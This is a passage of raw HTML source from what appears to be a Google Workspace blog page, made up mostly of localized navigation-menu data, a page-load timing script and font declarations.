공동작업\",\"/blog/ko/productivity-collaboration\"],[\"인증 및 보안 \",\"/blog/ko/identity-and-security\"],[\"Future of Work\",\"/blog/ko/future-of-work\"],[\"하이브리드 업무\",\"/blog/ko/hybrid-work\"],[\"고객 사례\",\"/blog/ko/customer-stories\"],[\"개발자\",\"/blog/ko/developers-practitioners\"],[\"파트너\",\"/blog/ko/partners\"],[\"이벤트\",\"/blog/ko/events\"],[\"공공부문\",\"/blog/ko/public-sector\"]]]],[\"제품 소식\",null,[[[\"Gmail\",\"/blog/ko/gmail\"],[\"Meet\",\"/blog/ko/meet\"],[\"Chat 및 Spaces\",\"/blog/ko/chat-spaces\"],[\"Drive\",\"/blog/ko/drive\"],[\"Docs\",\"/blog/ko/docs\"],[\"Sheets\",\"/blog/ko/sheets\"]]]]]]]],null,[[\"de\",[[[[[\"Enthaltene Anwendungen\",\"https://workspace.google.com/intl/de/features/\",[[[\"Gmail\",\"https://workspace.google.com/intl/de/products/gmail/\"],[\"Meet\",\"https://workspace.google.com/intl/de/products/meet/\"],[\"Chat\",\"https://workspace.google.com/intl/de/products/chat/\"],[\"Kalender\",\"https://workspace.google.com/intl/de/products/calendar/\"],[\"Drive\",\"https://workspace.google.com/intl/de/products/drive/\"],[\"Docs\",\"https://workspace.google.com/intl/de/products/docs/\"],[\"Tabellen\",\"https://workspace.google.com/intl/de/products/sheets/\"],[\"Präsentationen\",\"https://workspace.google.com/intl/de/products/slides/\"],[\"Formulare\",\"https://workspace.google.com/intl/de/products/forms/\"],[\"Sites\",\"https://workspace.google.com/intl/de/products/sites/\"],[\"Notizen\",\"https://workspace.google.com/intl/de/products/keep/\"],[\"Apps Script\",\"https://workspace.google.com/intl/de/products/apps-script/\"]]]]]],[[[\"Sicherheit und Verwaltung\",\"https://workspace.google.com/intl/de/security/\",[[[\"Admin\",\"https://workspace.google.com/intl/de/products/admin/\"],[\"Endpunkt\",\"https://workspace.google.com/intl/de/products/admin/endpoint/\"],[\"Vault\",\"https://workspace.google.com/intl/de/products/vault/\"],[\"Work Insights\",\"https://workspace.google.com/intl/de/products/workinsights/\"]]]],[\"Lösungen\",\"https://workspace.google.com/intl/de/solutions/\",[[[\"Neue Unternehmen\",\"https://workspace.google.com/intl/de/business/new-business/\"],[\"Kleine Unternehmen\",\"https://workspace.google.com/intl/de/business/small-business/\"],[\"Große Unternehmen\",\"https://workspace.google.com/intl/de/solutions/enterprise/\"],[\"Education\",\"https://edu.google.com/products/workspace-for-education/education-fundamentals/\"],[\"Nonprofit-Organisationen\",\"https://www.google.com/nonprofits/\"]]]]]],[[[\"Preise\",\"https://workspace.google.com/intl/de/pricing.html\",[[[\"Version auswählen\",\"https://workspace.google.com/intl/de/pricing.html\"]]]],[\"Add-ons\",null,[[[\"Gemini für Workspace\",\"https://workspace.google.com/solutions/ai/\"],[\"Google Voice\",\"https://workspace.google.com/intl/de/products/voice/\"],[\"AppSheet\",\"https://about.appsheet.com/home/\"]]]]]],[[[\"Ressourcen\",\"https://workspace.google.com/intl/de/faq/\",[[[\"Telearbeit\",\"https://workspace.google.com/intl/de/working-remotely/\"],[\"Sicherheit\",\"https://workspace.google.com/intl/de/security/\"],[\"FAQ\",\"https://workspace.google.com/intl/de/faq/\"],[\"Partner\",\"https://cloud.withgoogle.com/partners/?products\\u003dGOOGLE_WORKSPACE_PRODUCT\"],[\"Google Workspace Marketplace\",\"https://workspace.google.com/marketplace/\"],[\"Integrationen\",\"https://workspace.google.com/intl/de/integrations/\"],[\"Schulung \\u0026 Zertifizierung\",\"https://workspace.google.com/intl/de/training/\"]]]]]],[[[\"Schulung und Support\",\"https://workspace.google.com/intl/de/support/\",[[[\"Admin-Hilfe\",\"https://support.google.com/a/#topic\\u003d29157\"],[\"Einrichtungs- und Bereitstellungscenter\",\"https://workspace.google.com/setup/?hl\\u003dde\"],[\"Schulungscenter für Nutzer\",\"https://workspace.google.com/intl/de/learning-center/\"],[\"Foren für Administratoren\",\"https://productforums.google.com/forum/#!forum/apps\"],[\"Google Workspace-Dashboard\",\"https://www.google.com/appsstatus\"],[\"Presse\",\"https://cloud.google.com/press/\"]]]],[\"Mehr von Google\",null,[[[\"Google Cloud\",\"https://cloud.google.com/?hl\\u003dde\"],[\"Chrome Enterprise\",\"https://chromeenterprise.google/\"],[\"Google Lösungen für Unternehmen\",\"https://www.google.com/intl/de/services/\"],[\"Google Ads\",\"https://ads.google.com/home/?subid\\u003dde-de-xs-aw-z-a-dyn-accounts_wsft!o3\"],[\"Business Messages\",\"https://businessmessages.google/\"],[\"An Nutzerstudien teilnehmen\",\"https://userresearch.google.com/?reserved\\u003d0\\u0026utm_source\\u003dgsuite.google.com\\u0026Q_Language\\u003den\\u0026utm_medium\\u003down_srch\\u0026utm_campaign\\u003dGlobal-GSuite\\u0026utm_term\\u003d0\\u0026utm_content\\u003d0\\u0026productTag\\u003dgafw\\u0026campaignDate\\u003dnov18\\u0026pType\\u003dbprof\\u0026referral_code\\u003dug422768\"]]]]]]]]],[\"en\",[[[[[\"Included applications\",\"https://workspace.google.com/features/\",[[[\"Gmail\",\"https://workspace.google.com/products/gmail/\"],[\"Meet\",\"https://workspace.google.com/products/meet/\"],[\"Chat\",\"https://workspace.google.com/products/chat/\"],[\"Calendar\",\"https://workspace.google.com/products/calendar/\"],[\"Drive\",\"https://workspace.google.com/products/drive/\"],[\"Docs\",\"https://workspace.google.com/products/docs/\"],[\"Sheets\",\"https://workspace.google.com/products/sheets/\"],[\"Slides\",\"https://workspace.google.com/products/slides/\"],[\"Forms\",\"https://workspace.google.com/products/forms/\"],[\"Sites\",\"https://workspace.google.com/products/sites/\"],[\"Keep\",\"https://workspace.google.com/products/keep/\"],[\"Apps Script\",\"https://workspace.google.com/products/apps-script/\"]]]]]],[[[\"Security and management\",\"https://workspace.google.com/security/\",[[[\"Admin\",\"https://workspace.google.com/products/admin/\"],[\"Endpoint\",\"https://workspace.google.com/products/admin/endpoint/\"],[\"Vault\",\"https://workspace.google.com/products/vault/\"],[\"Work Insights\",\"https://workspace.google.com/products/workinsights/\"]]]],[\"Solutions\",\"https://workspace.google.com/solutions/\",[[[\"New Business\",\"https://workspace.google.com/business/new-business/\"],[\"Small Business\",\"https://workspace.google.com/business/small-business/\"],[\"Enterprise\",\"https://workspace.google.com/solutions/enterprise/\"],[\"Retail\",\"https://workspace.google.com/industries/retail/\"],[\"Manufacturing\",\"https://workspace.google.com/industries/manufacturing/\"],[\"Professional Services\",\"https://workspace.google.com/industries/professional-services/\"],[\"Technology\",\"https://workspace.google.com/industries/technology/\"],[\"Healthcare\",\"https://workspace.google.com/industries/healthcare/\"],[\"Government\",\"https://workspace.google.com/industries/government/\"],[\"Education\",\"https://edu.google.com/products/workspace-for-education/education-fundamentals/\"],[\"Nonprofits\",\"https://www.google.com/nonprofits/\"],[\"Artificial Intelligence\",\"https://workspace.google.com/solutions/ai/\"]]]]]],[[[\"Pricing\",\"https://workspace.google.com/pricing.html\",[[[\"Compare pricing plans\",\"https://workspace.google.com/pricing.html\"]]]],[\"Add-ons\",null,[[[\"Gemini for Workspace\",\"https://workspace.google.com/solutions/ai/\"],[\"Meet hardware\",\"https://workspace.google.com/products/meet-hardware/\"],[\"Google Voice\",\"https://workspace.google.com/products/voice/\"],[\"AppSheet\",\"https://about.appsheet.com/home/\"]]]]]],[[[\"Resources\",\"https://workspace.google.com/faq/\",[[[\"Working remotely\",\"https://workspace.google.com/working-remotely/\"],[\"Security\",\"https://workspace.google.com/security/\"],[\"Customer Stories\",\"https://workspace.google.com/customers/\"],[\"FAQs\",\"https://workspace.google.com/faq/\"],[\"Partners\",\"https://cloud.withgoogle.com/partners/?products\\u003dGOOGLE_WORKSPACE_PRODUCT\"],[\"Marketplace\",\"https://workspace.google.com/marketplace/\"],[\"Integrations\",\"https://workspace.google.com/integrations/\"],[\"Training \\u0026 Certification\",\"https://workspace.google.com/training/\"],[\"Refer Google Workspace\",\"https://workspace.google.com/landing/partners/referral/\"]]]]]],[[[\"Learning and support\",\"https://workspace.google.com/support/\",[[[\"Admin Help\",\"https://support.google.com/a/#topic\\u003d29157\"],[\"Setup and Deployment Center\",\"https://workspace.google.com/setup\"],[\"Learning Center for Users\",\"https://workspace.google.com/learning-center/\"],[\"Forums for Admins\",\"https://productforums.google.com/forum/#!forum/apps\"],[\"Google Workspace Dashboard\",\"https://www.google.com/appsstatus\"],[\"What\u0027s New in Google Workspace\",\"https://workspace.google.com/whatsnew/\"],[\"Find a Google Workspace Partner\",\"https://www.google.com/a/partnersearch/\"],[\"Join the community of IT Admins\",\"https://www.googlecloudcommunity.com/gc/Google-Workspace/ct-p/google-workspace\"],[\"Press\",\"https://cloud.google.com/press/\"]]]],[\"More from Google\",null,[[[\"Google Cloud\",\"https://cloud.google.com/\"],[\"Google Domains\",\"https://domains.google.com/about/?utm_source\\u003dgoogleappsforwork\\u0026utm_medium\\u003dreferral\\u0026utm_campaign\\u003dgooglepromos\"],[\"Chrome Enterprise\",\"https://chromeenterprise.google/\"],[\"Google Business Solutions\",\"https://www.google.com/services/\"],[\"Google Ads\",\"https://ads.google.com/home/?subid\\u003dus-en-xs-aw-z-a-dyn-accounts_wsft!o3\"],[\"Business Messages\",\"https://businessmessages.google/\"],[\"Join User Studies\",\"https://userresearch.google.com/?reserved\\u003d0\\u0026utm_source\\u003dgsuite.google.com\\u0026Q_Language\\u003den\\u0026utm_medium\\u003down_srch\\u0026utm_campaign\\u003dGlobal-GSuite\\u0026utm_term\\u003d0\\u0026utm_content\\u003d0\\u0026productTag\\u003dgafw\\u0026campaignDate\\u003dnov18\\u0026pType\\u003dbprof\\u0026referral_code\\u003dug422768\"]]]]]]]]],[\"fr\",[[[[[\"Enthaltene Anwendungen\",\"https://workspace.google.com/intl/fr/features/\",[[[\"Gmail\",\"https://workspace.google.com/intl/fr/products/gmail/\"],[\"Meet\",\"https://workspace.google.com/intl/fr/products/meet/\"],[\"Chat\",\"https://workspace.google.com/intl/fr/products/chat/\"],[\"Google Agenda\",\"https://workspace.google.com/intl/fr/products/calendar/\"],[\"Drive\",\"https://workspace.google.com/intl/fr/products/drive/\"],[\"Docs\",\"https://workspace.google.com/intl/fr/products/docs/\"],[\"Sheets\",\"https://workspace.google.com/intl/fr/products/sheets/\"],[\"Slides\",\"https://workspace.google.com/intl/fr/products/slides/\"],[\"Forms\",\"https://workspace.google.com/intl/fr/products/forms/\"],[\"Google Sites\",\"https://workspace.google.com/intl/fr/products/sites/\"],[\"Keep\",\"https://workspace.google.com/intl/fr/products/keep/\"],[\"Apps Script\",\"https://workspace.google.com/intl/fr/products/apps-script/\"]]]]]],[[[\"Sécurité et gestion\",\"https://workspace.google.com/intl/fr/security/\",[[[\"Console d\u0027administration\",\"https://workspace.google.com/intl/fr/products/admin/\"],[\"Point de terminaison\",\"https://workspace.google.com/intl/fr/products/admin/endpoint/\"],[\"Vault\",\"https://workspace.google.com/intl/fr/products/vault/\"],[\"Work Insights\",\"https://workspace.google.com/intl/fr/products/workinsights/\"]]]],[\"Solutions\",\"https://workspace.google.com/intl/fr/solutions/\",[[[\"Nouvelle entreprise\",\"https://workspace.google.com/intl/fr/business/new-business/\"],[\"PME\",\"https://workspace.google.com/intl/fr/business/small-business/\"],[\"Grande entreprise\",\"https://workspace.google.com/intl/fr/solutions/enterprise/\"],[\"Education\",\"https://edu.google.com/products/workspace-for-education/education-fundamentals/\"],[\"Associations\",\"https://www.google.com/nonprofits/\"]]]]]],[[[\"Tarifs\",\"https://workspace.google.com/intl/fr/pricing.html\",[[[\"Choisissez une édition\",\"https://workspace.google.com/intl/fr/pricing.html\"]]]],[\"Add-ons\",null,[[[\"Gemini pour Workspace\",\"https://workspace.google.com/solutions/ai/\"],[\"Matériel Meet\",\"https://workspace.google.com/intl/fr/products/meet-hardware/\"],[\"Google Voice\",\"https://workspace.google.com/intl/fr/products/voice/\"],[\"AppSheet\",\"https://about.appsheet.com/home/\"]]]]]],[[[\"Ressources\",\"https://workspace.google.com/intl/fr/faq/\",[[[\"Travail à distance\",\"https://workspace.google.com/intl/fr/working-remotely/\"],[\"Sécurité\",\"https://workspace.google.com/intl/fr/security/\"],[\"Questions fréquentes\",\"https://workspace.google.com/intl/fr/faq/\"],[\"Partenaires\",\"https://cloud.withgoogle.com/partners/?products\\u003dGOOGLE_WORKSPACE_PRODUCT\"],[\"Marketplace\",\"https://workspace.google.com/marketplace/\"],[\"Intégrations\",\"https://workspace.google.com/intl/fr/integrations/\"],[\"Formation et certification\",\"https://workspace.google.com/intl/fr/training/\"]]]]]],[[[\"Formation et assistance\",\"https://workspace.google.com/intl/fr/support/\",[[[\"Aide pour les administrateurs\",\"https://support.google.com/a/#topic\\u003d29157\"],[\"Centre de configuration et de déploiement\",\"https://workspace.google.com/setup/?hl\\u003dfr\"],[\"Centre de formation pour les utilisateurs\",\"https://workspace.google.com/intl/fr/learning-center/\"],[\"Forums pour les administrateurs\",\"https://productforums.google.com/forum/#!forum/apps\"],[\"Tableau de bord Google Workspace\",\"https://www.google.com/appsstatus#hl\\u003dfr\"],[\"Rechercher un partenaire Google Workspace\",\"https://www.google.com/a/partnersearch/?hl\\u003dfr#home\"],[\"Presse\",\"https://cloud.google.com/press/\"]]]],[\"Autres ressources Google\",null,[[[\"Google Cloud\",\"https://cloud.google.com/?hl\\u003dfr\"],[\"Chrome Enterprise\",\"https://chromeenterprise.google/\"],[\"Solutions d\u0027entreprise Google\",\"https://www.google.com/intl/fr/services/\"],[\"Google pour les Pros\",\"https://pourlespros.withgoogle.com/?utm_source\\u003dEngagement\\u0026utm_medium\\u003dep\\u0026utm_term\\u003dSMB\\u0026utm_content\\u003dFR%20Apps%20for%20work%20footert\\u0026utm_campaign\\u003dQ4_2015%20FR%20Apps%20for%20work%20footer\"],[\"Google Ads\",\"https://ads.google.com/home/?subid\\u003dfr-fr-xs-aw-z-a-dyn-accounts_wsft!o3\"],[\"Business Messages\",\"https://businessmessages.google/\"],[\"Participer aux études sur l\u0027expérience utilisateur\",\"https://userresearch.google.com/?reserved\\u003d0\\u0026utm_source\\u003dgsuite.google.com\\u0026Q_Language\\u003den\\u0026utm_medium\\u003down_srch\\u0026utm_campaign\\u003dGlobal-GSuite\\u0026utm_term\\u003d0\\u0026utm_content\\u003d0\\u0026productTag\\u003dgafw\\u0026campaignDate\\u003dnov18\\u0026pType\\u003dbprof\\u0026referral_code\\u003dug422768\"]]]]]]]]],[\"ja\",[[[[[\"ご利用いただけるアプリケーション\",\"https://workspace.google.com/intl/ja/features/\",[[[\"Gmail\",\"https://workspace.google.com/intl/ja/products/gmail/\"],[\"Meet\",\"https://workspace.google.com/intl/ja/products/meet/\"],[\"Chat\",\"https://workspace.google.com/intl/ja/products/chat/\"],[\"カレンダー\",\"https://workspace.google.com/intl/ja/products/calendar/\"],[\"ドライブ\",\"https://workspace.google.com/intl/ja/products/drive/\"],[\"ドキュメント\",\"https://workspace.google.com/intl/ja/products/docs/\"],[\"スプレッドシート\",\"https://workspace.google.com/intl/ja/products/sheets/\"],[\"スライド\",\"https://workspace.google.com/intl/ja/products/slides/\"],[\"フォーム\",\"https://workspace.google.com/intl/ja/products/forms/\"],[\"サイト\",\"https://workspace.google.com/intl/ja/products/sites/\"],[\"Keep\",\"https://workspace.google.com/intl/ja/products/keep/\"],[\"Apps Script\",\"https://workspace.google.com/intl/ja/products/apps-script/\"]]]]]],[[[\"セキュリティと管理\",\"https://workspace.google.com/intl/ja/security/\",[[[\"管理コンソール\",\"https://workspace.google.com/intl/ja/products/admin/\"],[\"エンドポイント\",\"https://workspace.google.com/intl/ja/products/admin/endpoint/\"],[\"Vault\",\"https://workspace.google.com/intl/ja/products/vault/\"],[\"Work Insights\",\"https://workspace.google.com/intl/ja/products/workinsights/\"]]]],[\"ソリューション\",\"https://workspace.google.com/intl/ja/solutions/\",[[[\"新規ビジネス\",\"https://workspace.google.com/intl/ja/business/new-business/\"],[\"小規模ビジネス\",\"https://workspace.google.com/intl/ja/business/small-business/\"],[\"大規模ビジネス\",\"https://workspace.google.com/intl/ja/solutions/enterprise/\"],[\"Education\",\"https://edu.google.com/intl/ja/products/workspace-for-education/education-fundamentals/\"],[\"非営利団体\",\"https://www.google.com/intl/ja/nonprofits/\"]]]]]],[[[\"料金\",\"https://workspace.google.com/intl/ja/pricing.html\",[[[\"エディションを選ぶ\",\"https://workspace.google.com/intl/ja/pricing.html\"]]]],[\"Add-ons\",null,[[[\"Gemini for Workspace\",\"https://workspace.google.com/solutions/ai/\"],[\"Meet ハードウェア\",\"https://workspace.google.com/intl/ja/products/meet-hardware/\"],[\"AppSheet\",\"https://about.appsheet.com/home/\"]]]]]],[[[\"関連情報\",\"https://workspace.google.com/intl/ja/faq/\",[[[\"リモートワーク\",\"https://workspace.google.com/intl/ja/working-remotely/\"],[\"セキュリティ\",\"https://workspace.google.com/intl/ja/security/\"],[\"事例紹介\",\"https://workspace.google.com/intl/ja/customers/\"],[\"よくある質問\",\"https://workspace.google.com/intl/ja/faq/\"],[\"パートナー\",\"https://cloud.withgoogle.com/partners/?products\\u003dGOOGLE_WORKSPACE_PRODUCT\"],[\"Marketplace\",\"https://workspace.google.com/intl/ja/marketplace/\"],[\"統合\",\"https://workspace.google.com/intl/ja/integrations/\"],[\"トレーニングと認定資格\",\"https://workspace.google.com/intl/ja/training/\"]]]]]],[[[\"学習とサポート\",\"https://workspace.google.com/intl/ja/support/\",[[[\"管理者用ヘルプ\",\"https://support.google.com/a/#topic\\u003d29157\"],[\"設定と導入のガイド\",\"https://workspace.google.com/setup/?hl\\u003dja\"],[\"ユーザー向けラーニング センター\",\"https://workspace.google.com/intl/ja/learning-center/\"],[\"管理者向けフォーラム\",\"https://productforums.google.com/forum/#!forum/apps\"],[\"Google Workspace ステータス ダッシュボード\",\"https://www.google.com/appsstatus#hl\\u003dja\"],[\"Google Workspace パートナーを探す\",\"https://www.google.com/a/partnersearch/?hl\\u003dja#home\"],[\"プレスリリース\",\"https://cloud.google.com/press/?hl\\u003dja\"]]]],[\"その他の Google サービス\",null,[[[\"Google Cloud\",\"https://cloud.google.com/?hl\\u003dja\"],[\"Chrome Enterprise\",\"https://chromeenterprise.google/\"],[\"Google ビジネス ソリューション\",\"https://www.google.com/intl/ja/services/\"],[\"Google 広告\",\"https://ads.google.com/home/?subid\\u003dja-ja-xs-aw-z-a-dyn-accounts_wsft!o3\"],[\"Business Messages\",\"https://businessmessages.google/\"],[\"ユーザー調査に参加する\",\"https://userresearch.google.com/?reserved\\u003d0\\u0026utm_source\\u003dgsuite.google.com\\u0026Q_Language\\u003den\\u0026utm_medium\\u003down_srch\\u0026utm_campaign\\u003dGlobal-GSuite\\u0026utm_term\\u003d0\\u0026utm_content\\u003d0\\u0026productTag\\u003dgafw\\u0026campaignDate\\u003dnov18\\u0026pType\\u003dbprof\\u0026referral_code\\u003dug422768\"]]]]]]]]],[\"ko\",[[[[[\"포함된 애플리케이션\",\"https://workspace.google.com/intl/ko/features/\",[[[\"Gmail\",\"https://workspace.google.com/intl/ko/products/gmail/\"],[\"Meet\",\"https://workspace.google.com/intl/ko/products/meet/\"],[\"Chat\",\"https://workspace.google.com/intl/ko/products/chat/\"],[\"Calendar\",\"https://workspace.google.com/intl/ko/products/calendar/\"],[\"Drive\",\"https://workspace.google.com/intl/ko/products/drive/\"],[\"Docs\",\"https://workspace.google.com/intl/ko/products/docs/\"],[\"Sheets\",\"https://workspace.google.com/intl/ko/products/sheets/\"],[\"Slides\",\"https://workspace.google.com/intl/ko/products/slides/\"],[\"설문지\",\"https://workspace.google.com/intl/ko/products/forms/\"],[\"사이트 도구\",\"https://workspace.google.com/intl/ko/products/sites/\"],[\"Keep\",\"https://workspace.google.com/intl/ko/products/keep/\"],[\"Apps Script\",\"https://workspace.google.com/intl/ko/products/apps-script/\"]]]]]],[[[\"보안 및 관리\",\"https://workspace.google.com/intl/ko/security/\",[[[\"관리\",\"https://workspace.google.com/intl/ko/products/admin/\"],[\"엔드포인트\",\"https://workspace.google.com/intl/ko/products/admin/endpoint/\"],[\"Vault\",\"https://workspace.google.com/intl/ko/products/vault/\"],[\"Work Insights\",\"https://workspace.google.com/intl/ko/products/workinsights/\"]]]],[\"솔루션\",\"https://workspace.google.com/intl/ko/solutions/\",[[[\"신규 업체\",\"https://workspace.google.com/intl/ko/business/new-business/\"],[\"중소기업\",\"https://workspace.google.com/intl/ko/business/small-business/\"],[\"엔터프라이즈\",\"https://workspace.google.com/intl/ko/solutions/enterprise/\"],[\"Education\",\"https://edu.google.com/products/workspace-for-education/education-fundamentals/\"],[\"비영리단체\",\"https://www.google.com/nonprofits/\"]]]]]],[[[\"가격\",\"https://workspace.google.com/intl/ko/pricing.html\",[[[\"버전 선택\",\"https://workspace.google.com/intl/ko/pricing.html\"]]]],[\"Add-ons\",null,[[[\"Workspace를 위한 Gemini\",\"https://workspace.google.com/solutions/ai/\"],[\"AppSheet\",\"https://about.appsheet.com/home/\"]]]]]],[[[\"리소스\",\"https://workspace.google.com/intl/ko/faq/\",[[[\"원격 근무\",\"https://workspace.google.com/intl/ko/working-remotely/\"],[\"보안\",\"https://workspace.google.com/intl/ko/security/\"],[\"FAQ\",\"https://workspace.google.com/intl/ko/faq/\"],[\"파트너\",\"https://cloud.withgoogle.com/partners/?products\\u003dGOOGLE_WORKSPACE_PRODUCT\"],[\"Marketplace\",\"https://workspace.google.com/intl/ko/marketplace/\"],[\"통합\",\"https://workspace.google.com/intl/ko/integrations/\"],[\"교육 및 인증\",\"https://workspace.google.com/intl/ko/training/\"]]]]]],[[[\"학습 및 지원\",\"https://workspace.google.com/intl/ko/support/\",[[[\"관리자 도움말\",\"https://support.google.com/a/#topic\\u003d29157\"],[\"설치 및 배포 센터\",\"https://workspace.google.com/setup/?hl\\u003dko\"],[\"사용자를 위한 학습 센터\",\"https://workspace.google.com/intl/ko/learning-center/\"],[\"관리자 포럼\",\"https://productforums.google.com/forum/#!forum/apps\"],[\"Google Workspace 대시보드\",\"https://www.google.com/appsstatus#hl\\u003dko\"],[\"Google Workspace 파트너 찾기\",\"https://www.google.com/a/partnersearch/?hl\\u003dko#home\"],[\"보도자료\",\"https://cloud.google.com/press/\"]]]],[\"Google의 다른 제품\",null,[[[\"Google Cloud\",\"https://cloud.google.com/?hl\\u003dko\"],[\"Chrome Enterprise\",\"https://chromeenterprise.google/\"],[\"Google 비즈니스 솔루션\",\"https://www.google.com/intl/ko_kr/business/\"],[\"Google Ads\",\"https://ads.google.com/home/?subid\\u003dkr-ko-xs-aw-z-a-dyn-accounts_wsft!o3\"],[\"Business Messages\",\"https://businessmessages.google/\"],[\"사용자 연구 참여\",\"https://userresearch.google.com/?reserved\\u003d0\\u0026utm_source\\u003dgsuite.google.com\\u0026Q_Language\\u003den\\u0026utm_medium\\u003down_srch\\u0026utm_campaign\\u003dGlobal-GSuite\\u0026utm_term\\u003d0\\u0026utm_content\\u003d0\\u0026productTag\\u003dgafw\\u0026campaignDate\\u003dnov18\\u0026pType\\u003dbprof\\u0026referral_code\\u003dug422768\"]]]]]]]]]]]","w2btAe":"%.@.null,null,\"\",false,null,null,true,false]","xn5OId":false,"xnI9P":true,"xwAfE":true,"y2FhP":"prod","yFnxrf":1884,"zChJod":"%.@.]"};</script><script nonce="wC8mBVAL5Ft29iPueo1EIg">(function(){'use strict';var a=window,d=a.performance,l=k();a.cc_latency_start_time=d&&d.now?0:d&&d.timing&&d.timing.navigationStart?d.timing.navigationStart:l;function k(){return d&&d.now?d.now():(new Date).getTime()}function n(e){if(d&&d.now&&d.mark){var g=d.mark(e);if(g)return g.startTime;if(d.getEntriesByName&&(e=d.getEntriesByName(e).pop()))return e.startTime}return k()}a.onaft=function(){n("aft")};a._isLazyImage=function(e){return e.hasAttribute("data-src")||e.hasAttribute("data-ils")||e.getAttribute("loading")==="lazy"};
a.l=function(e){function g(b){var c={};c[b]=k();a.cc_latency.push(c)}function m(b){var c=n("iml");b.setAttribute("data-iml",c);return c}a.cc_aid=e;a.iml_start=a.cc_latency_start_time;a.css_size=0;a.cc_latency=[];a.ccTick=g;a.onJsLoad=function(){g("jsl")};a.onCssLoad=function(){g("cssl")};a._isVisible=function(b,c){if(!c||c.style.display=="none")return!1;var f=b.defaultView;if(f&&f.getComputedStyle&&(f=f.getComputedStyle(c),f.height=="0px"||f.width=="0px"||f.visibility=="hidden"))return!1;if(!c.getBoundingClientRect)return!0;
var h=c.getBoundingClientRect();c=h.left+a.pageXOffset;f=h.top+a.pageYOffset;if(f+h.height<0||c+h.width<0||h.height<=0||h.width<=0)return!1;b=b.documentElement;return f<=(a.innerHeight||b.clientHeight)&&c<=(a.innerWidth||b.clientWidth)};a._recordImlEl=m;document.documentElement.addEventListener("load",function(b){b=b.target;var c;b.tagName!="IMG"||b.hasAttribute("data-iid")||a._isLazyImage(b)||b.hasAttribute("data-noaft")||(c=m(b));if(a.aft_counter&&(b=a.aft_counter.indexOf(b),b!==-1&&(b=a.aft_counter.splice(b,
1).length===1,a.aft_counter.length===0&&b&&c)))a.onaft(c)},!0);a.prt=-1;a.wiz_tick=function(){var b=n("prt");a.prt=b}};}).call(this);
l('DK1zsb')</script><script nonce="wC8mBVAL5Ft29iPueo1EIg">var _F_cssRowKey = 'boq-cloudx-web-blog.TransformBlogUi.zcSOI-C_kx0.L.B1.O';var _F_combinedSignature = 'AHrnUqWf0jKCEiTtFPaD_uP_MPXn8eLVxg';function _DumpException(e) {throw e;}</script><link rel="stylesheet" href="https://www.gstatic.com/_/mss/boq-cloudx-web-blog/_/ss/k=boq-cloudx-web-blog.TransformBlogUi.zcSOI-C_kx0.L.B1.O/am=OBgwCw/d=1/ed=1/rs=AHrnUqVc5aXD-3MNknPMzVYBeSg3jqaAAw/m=articleview,_b,_tp" data-id="_cl" nonce="zLwD_D2skbR2YicHSKB2yQ"><script nonce="wC8mBVAL5Ft29iPueo1EIg">onCssLoad();</script><style nonce="zLwD_D2skbR2YicHSKB2yQ">@font-face{font-family:'Product Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/productsans/v9/pxiDypQkot1TnFhsFMOfGShVGdeOcEg.woff2)format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Product Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/productsans/v9/pxiDypQkot1TnFhsFMOfGShVF9eO.woff2)format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJl1pynSEg.woff2)format('woff2');unicode-range:U+0308,U+0530-058F,U+2010,U+2024,U+25CC,U+FB13-FB17;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJl3pynSEg.woff2)format('woff2');unicode-range:U+0951-0952,U+0964-0965,U+0980-09FE,U+1CD0,U+1CD2,U+1CD5-1CD6,U+1CD8,U+1CE1,U+1CEA,U+1CED,U+1CF2,U+1CF5-1CF7,U+200C-200D,U+20B9,U+25CC,U+A8F1;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJlopynSEg.woff2)format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJlhpynSEg.woff2)format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJlkpynSEg.woff2)format('woff2');unicode-range:U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+20F0,U+25CC,U+A830-A839,U+A8E0-A8FF,U+11B00-11B09;}@font-face{font-family:'Google Sans';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/googlesans/v58/4Ua_rENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RFD48TE63OOYKtrwEIJl0pynSEg.woff2)format('woff2');unicode-range:U+030E,U+1200-1399,U+2D80-2DDE,U+AB01-AB2E,U+1E7E0-1E7E6,U+1E7E8-1E7EB,U+1E7ED-1E7EE,U+1E7F0-1E7FE;}@font-face{font-family:'Google 